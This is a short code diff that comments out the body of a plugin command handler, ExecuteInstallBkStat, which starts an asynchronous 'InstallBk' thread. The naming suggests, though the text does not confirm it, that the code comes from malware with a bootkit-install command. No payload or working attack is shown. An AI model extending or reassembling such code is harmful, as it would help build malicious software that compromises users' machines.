@@ -1009,7 +1009,7 @@ bool Plugin::ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args)
 
 bool Plugin::ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args)
 {
-	PDBG("ExecuteInstallBkStat", "Args: '%s'", Args);
+/*	PDBG("ExecuteInstallBkStat", "Args: '%s'", Args);
 
 	PCHAR ParamList = STR::New(Args);
 
@@ -1019,7 +1019,7 @@ bool Plugin::ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args)
 
 	StartThread(AsyncInstallBk, STR::New(PlugName.t_str()));
 
-	STR::Free(ParamList);
+	STR::Free(ParamList); */
 	return true;
 }
 
